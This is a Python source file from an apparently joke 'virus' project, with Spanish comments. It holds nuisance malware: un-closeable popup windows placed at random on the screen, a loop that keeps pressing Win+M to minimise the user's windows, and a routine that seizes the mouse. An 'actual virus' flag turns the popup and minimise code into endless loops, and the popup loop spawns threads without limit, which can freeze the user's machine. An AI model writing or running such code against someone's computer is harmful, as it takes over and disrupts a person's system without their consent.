from tkinter import *
import tkinter as tk

import threading
import random

import pyautogui as win
from time import sleep 

import Constants as C

class popupGenerator():
    def __init__(self):
        pass
    
    def disable_event():
        pass

    def move_window(self):
        root = Tk()
        root.title(C.POPUP_MESSAGE)
        root.attributes('-toolwindow',True)
        root.attributes('-disabled',True)

        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0,root.winfo_screenheight())
        root.resizable(0,0)
        root.geometry(f'300x50+{x}+{y}')
        root.configure(background='white')

        root.protocol("WM_DELETE_WINDOW", self.disable_event)
        
        root.mainloop()

    def start_popups(self,count):
        if __name__ != '__main__':
            if C.ACTUALVIRUS == False:
                for i in range(count):
                    thread = threading.Thread(target=self.move_window)
                    thread.start()
            else:
                while True:
                    thread = threading.Thread(target=self.move_window)
                    thread.start()

    def closeWindows(self):
        """
        Función para el cerrado de las ventanas del usuario.

        Args:
            infinite (bool, optional): 
            Especifica si se trabajará con la versión infinita del código (virus completo) o no (virus diluido para pruebas). Defaults to False.
        """
        if C.ACTUALVIRUS == False:
            for i in range(10):
                win.keyDown('winleft')
                win.press('m')
                win.keyUp('winleft')
                sleep(0.5)
        else:
            while True:
                win.keyDown('winleft')
                win.press('m')
                win.keyUp('winleft')
                sleep(0.1)

    def moveMouse(self):
        while True:
            x = random.randint(0, win.size().width - 10)
            y = random.randint(0,win.size().height - 10)
            win.moveTo(x,y,10)
            sleep(5)